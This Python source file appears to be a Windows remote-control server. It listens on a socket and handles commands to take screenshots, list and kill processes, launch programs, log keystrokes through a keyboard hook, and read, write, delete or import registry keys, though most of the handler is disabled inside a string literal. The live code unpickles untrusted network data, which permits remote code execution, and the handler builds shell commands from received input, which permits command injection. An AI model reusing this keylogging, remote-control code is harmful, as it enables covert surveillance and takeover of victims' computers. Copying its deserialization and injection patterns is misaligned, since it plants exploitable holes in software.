import time
import socket
import os, signal
from typing import AsyncIterable, List
from pynput import keyboard
import wmi
import subprocess
import pyscreenshot as ImageGrab
from pynput import keyboard
import threading
import winreg

#load enviroment variables
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 9090
MAX_FILE_SIZE = int(409600)

winregConst = {
    'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
    'HKEY_CURRENT_USER' : winreg.HKEY_CURRENT_USER,
    'HKEY_LOCAL_MACHINE' : winreg.HKEY_LOCAL_MACHINE,
    'HKEY_USERS' : winreg.HKEY_USERS,
    'HKEY_PERFORMANCE_DATA' : winreg.HKEY_PERFORMANCE_DATA,
    'HKEY_CURRENT_CONFIG' : winreg.HKEY_CURRENT_CONFIG,
    'HKEY_DYN_DATA' : winreg.HKEY_DYN_DATA,
    'String': winreg.REG_SZ,
    'Binary': winreg.REG_BINARY,
    'DWORD': winreg.REG_DWORD,
    'QWORD': winreg.REG_QWORD,
    'Multi-String': winreg.REG_MULTI_SZ,
    'Expandable String': winreg.REG_EXPAND_SZ
}

#keyborad recode init
keyboardRecord = '' #string save record value
recorded = False

def processKeyPress(key: keyboard.KeyCode):
    key = str(key)
    key = key.replace("'", "")
    global keyboardRecord
    print(key)
    if len(key) == 1:
        keyboardRecord += key
    if (key == 'Key.enter'):
        keyboardRecord += '\n'
    if (key == 'Key.space'):
        keyboardRecord += ' '

listener = keyboard.Listener(on_press=processKeyPress)

#process function
def sendScreenShotImage(conn):
    im = open('screenshot.png', 'rb')
    imBytes = im.read()
    conn.sendall(imBytes)
    pass

def getProcessRunning():
    f = wmi.WMI()
    return f.Win32_process()

def getListRunningWinodws():
    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description,Id'
    ret = []
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    for line in proc.stdout:
        if not line.decode()[0].isspace():
            temp = (line.decode().rstrip())
            ret.append(temp)
    ret = ret[2:]
    return ret

def processRequest(request, conn):
    print(request)
    '''if request == 'screenshot':
        im = ImageGrab.grab()
        im.save('screenshot.png')
        sendScreenShotImage(conn)
    
    if request == 'process running':
        listProcess = getProcessRunning()
        for process in listProcess:
            temp = (f"{process.ProcessId:<10} {process.Name}")
            conn.sendall(bytes(temp, 'utf8'))
        conn.sendall(b'done')

    if request == 'kill process':
        conn.sendall(b'Received request kill process')
        data = conn.recv(1024)
        processId = data.decode('utf8')
        os.kill(int(data), signal.SIGTERM)

    if request == 'application running':
        temp = getListRunningWinodws()
        for line in temp:
            time.sleep(0.1)
            conn.sendall(bytes(line, 'utf8'))
        conn.sendall(b'done')

    if request == 'start application':
        conn.sendall(b'application name')
        data = conn.recv(1024)
        print(data.decode('utf8'))
        res = os.system('start ' + data.decode('utf8'))
        conn.sendall(bytes(str(res), 'utf8'))

    if request == 'start key hook':
        global recorded
        global keyboardRecord
        if recorded == False:
            recorded = True
            keyboardRecord = ''
            listener.start()
            conn.sendall(b'start key hook success')
        else:
            conn.sendall(b'key hook is running')

    if request == 'stop key hook':
        if recorded == True:
            print(keyboardRecord)
            recorded = False
            listener.stop()
            conn.sendall(b'stop key hook success')
        else:
            conn.sendall(b'key hook is not running')
            print('key hook is not running')
    
    if request == 'get recorded string':
        conn.sendall(bytes(keyboardRecord, 'utf8'))

    if request == 'send file':
        fileData = str
        conn.sendall(b'ready to recvive')
        while True:
            fileData = conn.recv(MAX_FILE_SIZE)
            if fileData:
                break
        fileData = fileData.decode('utf8')
        file = open('regFile.reg', 'w')
        file.write(str(fileData))
        file.close()
        temp = subprocess.call(['reg', 'import', 'regFile.reg'])
        conn.sendall(bytes(str(temp), 'utf8'))
    
    if request == 'reg get value':
        path = conn.recv(4096)
        path = path.decode('utf8')
        path = path.split('\\', 1)
        valueName = conn.recv(1024)
        valueName = valueName.decode('utf8')
        try:
            key = winreg.OpenKey(winregConst[path[0]], path[1], 0, winreg.KEY_ALL_ACCESS)
            temp = winreg.QueryValueEx(key, valueName)
            winreg.CloseKey(key)
            conn.sendall(bytes(temp[0], 'utf8'))
        except:
            conn.sendall(b'File dose not exits')

    if request == 'reg set value':
        path = conn.recv(4096)
        path = path.decode('utf8')
        path = path.split('\\', 1)
        data = conn.recv(4096)
        data = data.decode('utf8')
        valueName = conn.recv(1024)
        valueName = valueName.decode('utf8')
        dataType = conn.recv(4096)
        dataType = dataType.decode('utf8')
        try:
            key = winreg.OpenKey(winregConst[path[0]], path[1], 0, winreg.KEY_ALL_ACCESS)
            temp = winreg.SetValueEx(key, valueName, 0, winregConst[dataType], data)
            winreg.CloseKey(key)
            conn.sendall(b'Done')
        except:
            conn.sendall(b'File dose not exits')
        
    if request == 'reg delete value':
        path = conn.recv(4096)
        path = path.decode('utf8')
        path = path.split('\\', 1)
        valueName = conn.recv(1024)
        valueName = valueName.decode('utf8')
        try:
            key = winreg.OpenKey(winregConst[path[0]], path[1], 0, winreg.KEY_ALL_ACCESS)
            temp = winreg.DeleteValue(key, valueName)
            winreg.CloseKey(key)
            conn.sendall(b'Done')
        except:
            conn.sendall(b'File dose not exits')

    if request == 'reg create key':
        path = conn.recv(4096)
        path = path.decode('utf8')
        path = path.split('\\', 1)
        try:
            key = winreg.CreateKey(winregConst[path[0]], path[1])
            winreg.CloseKey(key)
            conn.sendall(b'Done')
        except:
            conn.sendall(b'Cannot create new key')
    
    if request == 'reg delete key':
        path = conn.recv(4096)
        path = path.decode('utf8')
        path = path.split('\\', 1)
        try:
            winreg.DeleteKey(winregConst[path[0]], path[1])
            conn.sendall(b'Done')
        except:
            conn.sendall(b'Cannot delete key')
'''
import pickle
from struct import *

def receive_obj(client):
	msg = bytearray()
	header = client.recv(4096)
	(length,) = unpack('>Q',header)
	length_recv = 0
	while length_recv < length:
		s = client.recv(4096)
		msg += s
		length_recv += len(s)
	return pickle.loads(msg)

if __name__ == '__main__':
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((SERVER_HOST, int(SERVER_PORT)))
        s.listen()
        while True:
            conn, addr = s.accept()
            with conn:
                print('Connected by: ', addr)
                while True:
                    request = receive_obj(conn)
                    #if not request:
                     #  break
                    #print(request)
                    processRequest(request, conn)
                conn.close()